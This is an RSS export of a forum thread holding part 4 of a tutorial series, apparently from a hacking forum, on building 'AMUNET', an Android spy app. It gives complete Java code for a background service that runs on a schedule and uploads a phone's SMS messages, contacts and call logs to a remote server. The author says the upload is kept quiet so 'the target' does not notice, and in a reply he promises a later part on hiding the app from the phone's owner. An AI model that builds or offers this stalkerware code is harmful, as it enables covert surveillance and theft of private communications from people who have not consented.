<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
    <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375</link>
    <description>Greetings my fellow hackers,

As we continue with our series, the AMUNET app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.

**PREVIOUS TUTORIALS**

Below are the tutorials covered so far.

1. [Introduction to Amunet](https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4)
2. [Get Installed Apps](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121)
3. [Sending Information to Web Server](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168)
4. [Granting Permission for Extra Functions](https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317)

**FAQ**

I have been receiving questions from readers and these ones are most prevalent.

Q: How to collect information on my localhost
A: The tutorial does not limit you to the test server. As stated earlier, just change the server endpoint ( ip address ) in the `Configuration.java` and make sure your server accepts the POST parameters being passed.

Q: Can I get the source code ( PHP )  for your test server
A: Absolutely not.

Q: Where is my data stored on the test server ?
A: I am a great fan of privacy and data protection. With that said, every data sent to the test server is encrypted ( username and password ). I use bcrypt for protecting confidential information and as a result, I do have access to the information stored on the server but cannot decrypt or read them. Only the right user.

Q: Will I pay for using the test server ?
A: Absolutely not. The server was only set up to help with the tutorial. No need to pay anything. It&#39;s set up out of good will.

Q: What&#39;s the API auth key thing ?
A: The API Auth key helps the server identify the correct user. Without it, any data sent will be rejected.

Q: Do I need the API auth key on my local server ?
A: No please. You do not need an auth key on your local server. You only need to accept the POST parameters being sent by Volley and thats all.

**TODAY&#39;S TUTORIAL**

In today&#39;s tutorial, we will persistently collect information about the contacts on the phone, call logs and text messages ( sms ). Persistently in the sense that, we are going to put the codes in a service which runs periodically ( time to time, intervals ) and make sure we have up to date information. You can set the interval to any value ranging from a minute to any hour of the day. 

Continuing from the previous tutorial, lets add one more button that will trigger monitoring on the target device. Lets go to our `content_dashboard.xml` and add the button.

    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
    &lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;
    xmlns:tools=&quot;http://schemas.android.com/tools&quot;
    android:layout_width=&quot;match_parent&quot;
    android:layout_height=&quot;match_parent&quot;
    app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot;
    tools:context=&quot;.Dashboard&quot;
    tools:showIn=&quot;@layout/activity_dashboard&quot;&gt;

    &lt;android.support.v7.widget.RecyclerView
        android:layout_width=&quot;match_parent&quot;
        android:layout_above=&quot;@id/service_monitor_button&quot;
        android:id=&quot;@+id/dashboard_recycler_view&quot;
        android:layout_height=&quot;match_parent&quot; /&gt;

    &lt;Button
        android:layout_width=&quot;match_parent&quot;
        android:text=&quot;Start MONITORING&quot;
        android:padding=&quot;10dp&quot;
        android:id=&quot;@+id/service_monitor_button&quot;
        android:textColor=&quot;@android:color/white&quot;
        android:background=&quot;@color/colorPrimary&quot;
        style=&quot;@style/Base.Widget.AppCompat.Button.Borderless&quot;
        android:layout_alignParentBottom=&quot;true&quot;
        android:layout_height=&quot;wrap_content&quot; /&gt;

    &lt;/RelativeLayout&gt;

With our button declared in the layout, lets declare in the `Dashboard.java` file. Below the `public class Dashboard ...` statement, declare the button.

    public class Dashboard extends AppCompatActivity {

         private RecyclerView recyclerView;
         private List&lt;RecyclerJava&gt; recyclerJavaList = new ArrayList&lt;&gt;();
         private RecyclerAdapter recyclerAdapter;

         private Button service_monitor_btn; // New added button declaration

         protected static final int GPS_REQUEST_CODE = 5000;
         protected static final int CONTACTS_REQUEST_CODE = 5001;
         protected static final int CALENDAR_REQUEST_CODE = 5002;
         protected static final int MIC_REQUEST_CODE = 5003;
         protected static final int CAMERA_REQUEST_CODE = 5004;
         protected static final int STORAGE_REQUEST_CODE = 5005;
         protected static final int SMS_REQUEST_CODE = 5006;

**ONCREATE METHOD**

With our button declared, lets scroll to the `onCreate` method and set reference to our button and set the click listener.

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dashboard);
        Toolbar toolbar = findViewById(R.id.dashboard_toolbar);
        setSupportActionBar(toolbar);

        recyclerView = findViewById(R.id.dashboard_recycler_view);

        recyclerAdapter = new RecyclerAdapter(recyclerJavaList);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(getApplicationContext());
        recyclerView.setLayoutManager(mLayoutManager);
        recyclerView.setItemAnimator(new DefaultItemAnimator());
        recyclerView.addItemDecoration(new DividerItemDecoration(Dashboard.this, LinearLayoutManager.VERTICAL));
       
        // Finding the button
        service_monitor_btn = findViewById(R.id.service_monitor_button);

       // Checking if our TimerService is running
        if(MyServiceIsRunning(TimerService.class)) {
            service_monitor_btn.setText(&quot;STOP MONITORING&quot;);
        } else {
            service_monitor_btn.setText(&quot;START MONITORING&quot;);
        }
       
        // Setting a click listener on the button
        service_monitor_btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if(MyServiceIsRunning(TimerService.class)) {
                    Log.i(&quot;0x00sec&quot;, &quot;Stopping Service ...&quot;);
                    stopService(new Intent(Dashboard.this, TimerService.class));
                    service_monitor_btn.setText(&quot;START MONITORING&quot;);
                } else {
                    Log.i(&quot;0x00sec&quot;, &quot;Starting Service ...&quot;);
                    startService(new Intent(Dashboard.this, TimerService.class));
                    service_monitor_btn.setText(&quot;STOP MONITORING&quot;);
                }
            }
        });

        updateRecycler();
    }

1 - We assign the button to the view object in the layout file.
2  - `MyServiceIsRunning` is a method that checks if a service is running. We want the text on the button to be set to `stop` when the `service is running` and `start` when the `service is not running`.
3 - The service to check is `TimerService.class`. Its function is to set a repeating alarm function that calls a Broadcast receiver which sends information to the server. Let&#39;s take it bit by bit.

**MYSERVICEISRUNNING**

This methods as explained accepts a service parameter and checks if the service is running or not and returns a boolean value ( true / false )

    private boolean MyServiceIsRunning(Class&lt;?&gt; serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

**TIMERSERVICE**

This service starts a repeating alarm ( [Alarm Manager](https://developer.android.com/training/scheduling/alarms) ) that calls a Broadcast receiver. The receiver then begins uploading the information. Create a new java class and extend it to the Service class.

![11|530x413](upload://8FRroOgs8HX9g8b9DftVba9JEA7.png)

Lets code.

    import android.app.AlarmManager;
    import android.app.PendingIntent;
    import android.app.Service;
    import android.content.Context;
    import android.content.Intent;
    import android.os.IBinder;
    import android.os.SystemClock;
    import android.support.annotation.Nullable;
    import android.util.Log;

    public class TimerService extends Service {

    @Override
    public void onCreate() {
        super.onCreate();

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(TimerService.this, ServerUpdateReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this,0,intent, 0);
        alarmManager.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime(),
                AlarmManager.INTERVAL_HOUR,
                pendingIntent);
        // stopSelf(); // Optional
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() { // Stop Service
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    }

The only important method is the `onCreate` method.

Using the AlarmManager, we schedule a repeating alarm to call `ServerUpdateReceiver.class` ( Broadcast Receiver ). Data can be passed to the receiver through the `intent.putExtra` call but we won&#39;t be passing any for now.

Another thing to carefully take note is `AlarmManager.INTERVAL_HOUR`. This piece of parameter ( in Milliseconds ) is the interval for the alarm. The minimum is 60 seconds ( 1 minute - 60000ms ), you cannot set below that. Android will forcefully set it up to a minute if you set it below 60 seconds. We configure our receiver to be called every hour. It is recommended to even increase it a bit as frequent calls can calls the app to crash, battery drain or have our app kill in case of low memory situation. 

I am fully aware that we are not checking if the phone is connected to the Internet before sending data. We will fix that later but for the mean time, we have to make sure the phone is connected to the internet. Repeated calls with no internet connection will cause the app to crash temporarily. Temporarily because the alarm call will be fired again which in turn will call our receiver again. Ever repeating.:yum:

**SERVERUPDATERECEIVER ( BROADCAST )**

This receiver simply sends periodic data to our defined server. If a permission is not granted, the appropriate method will not be called because android will not permit us to collect data we do not have permission to.

Create a java class and extend it to the BroadcastReceiver class.

![21|529x415](upload://mDkiZ4UOjyO8NHwwh7OPwHfy51i.png)

Remember, if you are not naming your objects according to the ones in the tutorial, make sure you replace them according in the codes.

The only needed method for a BroadcastReceiver is the `onReceive` Override method. Your code should be something like this:

    public class ServerUpdateReceiver extends BroadcastReceiver {
    
       @Override
       public void onReceive(Context context, Intent intent) {

       }

    }

Below the `public class` statement, lets declare a `Context`. With this, all other methods can access it.

    public class ServerUpdateReceiver extends BroadcastReceiver {

        Context context;
        ...

**ONRECEIVE METHOD**

Within the method, we first check if a permission is granted, then call the appropriate method. This tutorial will cover contacts, call logs and sms messages.

    @Override
    public void onReceive(Context context, Intent intent) {

        this.context = context;

        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    update_Server_SMS();
                }
            }).start();
        }

        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    update_Server_Contacts();
                    update_Server_Call_Logs();
                }
            }).start();
        }
    }

The method that sends our SMS message to the server is `update_Server_SMS` and the methods responsible for sending the contact information and call log are `update_Server_Call_Logs` and `update_Server_Contacts`.

Instead of having different methods handle communication to the server. We will instead create a method to accept `POST parameters` and handler communications. With this, all methods in the class can communicate externally by calling it and passing along  their parameter.

**UPDATE_SERVER METHOD**

Update server is the method that handles communication to the server. It accepts POST parameters and sends them along.

    private void update_Server(final Map&lt;String, String&gt; params) {

        RequestQueue requestQueue = Volley.newRequestQueue(context);

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener&lt;String&gt;() {
            @Override
            public void onResponse(String req) {
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            protected Map&lt;String, String&gt; getParams() {
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

Since this class is non-UI ( erm, maybe can do little UI jobs like toast, notification, etc ), we don&#39;t want to push any notification like upload complete because it&#39;s a spy app :blush: and we don&#39;t want the target to know that information has been sent. Quiet as possible. We therefore don&#39;t include any UI codes here. Since we are also blind as to whether our data was saved or not, we have make sure the server receives the data correctly. Moving on ...

**UPDATE_SERVER_SMS**

This method reads the SMS database of the phone ( inbox, draft, sent ) and sends them to the server through the `update_Server` method.

    private void update_Server_SMS() {

        SharedPreferences sharedPreferences = context.getSharedPreferences(&quot;Auth&quot;, Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString(&quot;auth_key&quot;, null);

        try {
            Uri uriSMSURI = Uri.parse(&quot;content://sms&quot;);

            Cursor cursor = context.getContentResolver().query(uriSMSURI, null, null, null,null);

            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(&quot;address&quot;)).toString();
                String message = cursor.getString(cursor.getColumnIndexOrThrow(&quot;body&quot;)).toString();
                String date = cursor.getString(cursor.getColumnIndexOrThrow(&quot;date&quot;)).toString();
                String read = cursor.getString(cursor.getColumnIndexOrThrow(&quot;read&quot;)).toString();
                String type = cursor.getString(cursor.getColumnIndexOrThrow(&quot;type&quot;)).toString();
                String id = cursor.getString(cursor.getColumnIndexOrThrow(&quot;_id&quot;)).toString();

                if(read.equals(&quot;0&quot;)) { read = &quot;no&quot;; } else { read = &quot;yes&quot;; }
                if(type.equals(&quot;1&quot;)) { type = &quot;inbox&quot;; } else if(type.equals(&quot;2&quot;)) { type = &quot;sent&quot;; } else { type = &quot;draft&quot;; }
                date = get_Long_Date(date);

                // THIS IS HOW TO CREATE THE POST PARAMETERS ( MAP ARRAY )
                Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
                params.put(&quot;address&quot;, address);
                params.put(&quot;message&quot;, message);
                params.put(&quot;date&quot;, date);
                params.put(&quot;read&quot;,  read);
                params.put(&quot;id&quot;, id);
                params.put(&quot;type&quot;, type);
                params.put(&quot;auth&quot;, auth_key);

                update_Server(params);
            }
        } catch (Exception e) {
        }
    }

1 - `content://sms` - allows us to loop through the entire SMS database not limiting ourself to the inbox, draft or sent messages.

2 - `cursor.getColumnIndexOrThrow` - allows us to get the appropriate column index of the cursor. Mind you, entering a wrong Column name will cause the app to crash. These are the meanings of the columns.

1. address - phone number
2. message - content of messages
3. date - time of message
4. read - status of message ( 0 - not read, 1 - read )
5. type - type of message ( 1 - inbox, 2 - outbox, 3 - draft ( guess work) )
6. id - unique message identifier

3 - The date is constructed into human readable with `get_Long_Date`.

4 - We then construct our POST parameters and call the `update_Server` method to communicate the information.

The server should then be receiving something like `$_POST[&#39;address&#39;] &amp;&amp; $_POST[&#39;message&#39;] ...`

**GET_LONG_DATE METHOD**

Accepts and converts the passed argument into readable.

    private String get_Long_Date(String date) {
        Long timestamp = Long.parseLong(date);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(timestamp);
        DateFormat formatter = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;);
        return formatter.format(calendar.getTime());
    }

**UPDATE_SERVER_CONTACTS**

This method just like the one above it, loops through the Contact database, gets information and sends it.

    private void update_Server_Contacts() {

        SharedPreferences sharedPreferences = context.getSharedPreferences(&quot;Auth&quot;, Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString(&quot;auth_key&quot;, null);

        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,
                null, null, null);
        while (cursor.moveToNext()) {
            try{
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String phoneNumber = null;

                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) &gt; 0) {
                    Cursor phones = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +&quot; = &quot;+ contactId, null, null);
                    while (phones.moveToNext()) {
                        phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
                        break;
                    }
                    phones.close();

                    if(phoneNumber != null) {

                        Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
                        params.put(&quot;contact_name&quot;, name);
                        params.put(&quot;contact_phone&quot;, phoneNumber);
                        params.put(&quot;auth&quot;, auth_key);

                        update_Server(params);
                    }
                }
            }catch(Exception e) {

            }
        }
    }

Again, changing the ColumnIndex will cause the app to crash. They are constant values.

**UPDATE_SERVER_CALL_LOGS**

The methods just like the other two loops through the call logs database and fetches information.

    @SuppressLint(&quot;MissingPermission&quot;)
    private void update_Server_Call_Logs() {

        SharedPreferences sharedPreferences = context.getSharedPreferences(&quot;Auth&quot;, Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString(&quot;auth_key&quot;, null);

        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int phone_number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

        while (cursor.moveToNext()) {
            String number = cursor.getString(phone_number);
            String call_type = cursor.getString(type);
            String call_date = get_Long_Date(cursor.getString(date));
            String call_duration = cursor.getString(duration);
            int call_code = Integer.parseInt(call_type);

            switch (call_code) {
                case CallLog.Calls.OUTGOING_TYPE:
                    call_type = &quot;OUTGOING&quot;;
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    call_type = &quot;INCOMING&quot;;
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    call_type = &quot;MISSED&quot;;
                    break;
            }

            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
            
            params.put(&quot;phone_number&quot;, number);
            params.put(&quot;call_date&quot;, call_date);
            params.put(&quot;call_type&quot;, call_type);
            params.put(&quot;call_duration&quot;, call_duration);
            params.put(&quot;auth&quot;, auth_key);

            update_Server(params);
        }

        cursor.close();
    }

We are done for this tutorial. Before we get ahead of ourselves. It took me days to realize that I had forgotten to add the appropriate call logs permission although we had already added them in the previous tutorial. Without `READ_CALL_LOGS` and `WRITE_CALL_LOGS` permission. We cannot access the call logs. Lets add them to `AndroidManifest.xml`.

    &lt;uses-permission android:name=&quot;android.permission.READ_CALL_LOG&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_CALL_LOG&quot; /&gt;

Go ahead now and run your android app. Allow permissions and start monitoring. Your data should be sent to the test server ( if you used my test server ). 

**CONCLUSION**

I love your contributions, suggestions, feedbacks, critics, etc. Anything to help the series.

You can directly import the project into your android studio if you are having trouble.

Checkout the github repo: https://github.com/sergeantexploiter/Amunet

Until we meet again. I’m out.

**#Sergeant**</description>
    
    <lastBuildDate>Thu, 02 Aug 2018 12:39:55 +0000</lastBuildDate>
    <category>Phone Hacking</category>
    <atom:link href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/8">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/8</link>
        <pubDate>Thu, 02 Aug 2018 14:36:54 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-7375-8</guid>
        <source url="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
        <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
        <description><![CDATA[
            <p>The part where the application hides will come. As you noticed, it is in parts so don’t worry. I’ve got you covered on that one. Stealth is very essential.</p>
<p><span class="hashtag">#Sergeant</span></p>
          <p><a href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/7">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/7</link>
        <pubDate>Thu, 02 Aug 2018 12:39:55 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-7375-7</guid>
        <source url="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
        <dc:creator><![CDATA[costa]]></dc:creator>
        <description><![CDATA[
            <p>good afternoon thank you very much if it served but in real phones the only thing if I saw that the application is not hidden is always in the view of the owner of the phone which upon seeing that application will be uninstalled and lost everything there would be some update or improvement for The application is hidden inside the phone and do not remove it</p>
          <p><a href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/6">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/6</link>
        <pubDate>Wed, 01 Aug 2018 22:57:36 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-7375-6</guid>
        <source url="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
        <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
        <description><![CDATA[
            <p>I think I get you now. Okay so if the app displays the <code>internet disconnected</code> message then you are truly disconnected. It’s actually a problem for emulators to not have internet connection whilst the host machine has it. Search on Google how to fix the problem. There are a lot of guides out there.</p>
<p>You can simply run it on actual phone to see if it behaves the same ( which I strongly believe otherwise ). The app will still work for registration even if you turn the permissions off ( except the <code>READ_PHONE_STATE</code> permission ). Let me know the feedback.</p>
          <p><a href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/5">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/5</link>
        <pubDate>Tue, 17 Jul 2018 07:38:14 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-7375-5</guid>
        <source url="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
        <dc:creator><![CDATA[costa]]></dc:creator>
        <description><![CDATA[
            <p>what happens is that I do not know English very well what happens is when I compile the application with android studio everything goes well, but at the moment of installing it in an android emulator I register the name and the user and the password I register and it appears to me disconnected from the internet and it does not let me do anything more and in your page it is to say in the server I try to register but it does not let me do anything either.</p>
          <p><a href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/4</link>
        <pubDate>Mon, 16 Jul 2018 20:31:41 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-7375-4</guid>
        <source url="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
        <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
        <description><![CDATA[
            <p>Okay <a class="mention" href="https://d.clarkee.co.uk/u/costa">@costa</a>, sorry for the delay in reply. To start with, the grammar is not quite clear so I’m having trouble understanding the question. What I got was ?</p>
<p>You used the github link to build the Amunet app unto your emulator and proceeded to register with your credentials.</p>
<aside class="quote no-group" data-username="costa" data-post="2" data-topic="7375">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/user_avatar/d.clarkee.co.uk/costa/48/8041_2.png" class="avatar"> costa:</div>
<blockquote>
<p>and I appear offline internet do not know why I just want to try the application</p>
</blockquote>
</aside>
<p>This is the part I don’t quite get. If you could clarify a bit.</p>
<p>Noticed, you asked about installing the app on an emulator. Well, the tutorials wasn’t based on an emulator but instead on a real phone. That is why, I blank out some sensitive information in the tutorial. So I don’t have knowledge on any challenges that you’ll encounter whilst using the emulator. The emulator can quite be restricting.</p>
          <p><a href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/3">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/3</link>
        <pubDate>Fri, 13 Jul 2018 15:21:14 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-7375-3</guid>
        <source url="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
        <dc:creator><![CDATA[costa]]></dc:creator>
        <description><![CDATA[
            <p>good afternoon I have a question that happens when I compile the Amunet-master application of github in android studio compiles well that is to say generates the pk in the file debug or relase whenever I install it in an android emulator and I give it a username, name and password I give in regsitrar and I appear offline internet do not know why I just want to try the application first in an emulator android and then in a real phone and to clarify I’m not changing parameter I’m using your test server</p>
          <p><a href="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375/2</link>
        <pubDate>Thu, 12 Jul 2018 11:42:18 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-7375-2</guid>
        <source url="https://d.clarkee.co.uk/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375.rss">Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</source>
      </item>
      <item>
        <title>Building a God’s Eye Android App: Part 4 - Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</title>
        <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
        <description><![CDATA[
            <p>Greetings my fellow hackers,</p>
<p>As we continue with our series, the AMUNET app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.</p>
<p><strong>PREVIOUS TUTORIALS</strong></p>
<p>Below are the tutorials covered so far.</p>
<ol>
<li><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4">Introduction to Amunet</a></li>
<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-1-collecting-installed-android-apps/7121">Get Installed Apps</a></li>
<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168">Sending Information to Web Server</a></li>
<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317">Granting Permission for Extra Functions</a></li>
</ol>
<p><strong>FAQ</strong></p>
<p>I have been receiving questions from readers and these ones are most prevalent.</p>
<p>Q: How to collect information on my localhost<br>
A: The tutorial does not limit you to the test server. As stated earlier, just change the server endpoint ( ip address ) in the <code>Configuration.java</code> and make sure your server accepts the POST parameters being passed.</p>
<p>Q: Can I get the source code ( PHP )  for your test server<br>
A: Absolutely not.</p>
<p>Q: Where is my data stored on the test server ?<br>
A: I am a great fan of privacy and data protection. With that said, every data sent to the test server is encrypted ( username and password ). I use bcrypt for protecting confidential information and as a result, I do have access to the information stored on the server but cannot decrypt or read them. Only the right user.</p>
<p>Q: Will I pay for using the test server ?<br>
A: Absolutely not. The server was only set up to help with the tutorial. No need to pay anything. It’s set up out of good will.</p>
<p>Q: What’s the API auth key thing ?<br>
A: The API Auth key helps the server identify the correct user. Without it, any data sent will be rejected.</p>
<p>Q: Do I need the API auth key on my local server ?<br>
A: No please. You do not need an auth key on your local server. You only need to accept the POST parameters being sent by Volley and thats all.</p>
<p><strong>TODAY’S TUTORIAL</strong></p>
<p>In today’s tutorial, we will persistently collect information about the contacts on the phone, call logs and text messages ( sms ). Persistently in the sense that, we are going to put the codes in a service which runs periodically ( time to time, intervals ) and make sure we have up to date information. You can set the interval to any value ranging from a minute to any hour of the day.</p>
<p>Continuing from the previous tutorial, lets add one more button that will trigger monitoring on the target device. Lets go to our <code>content_dashboard.xml</code> and add the button.</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
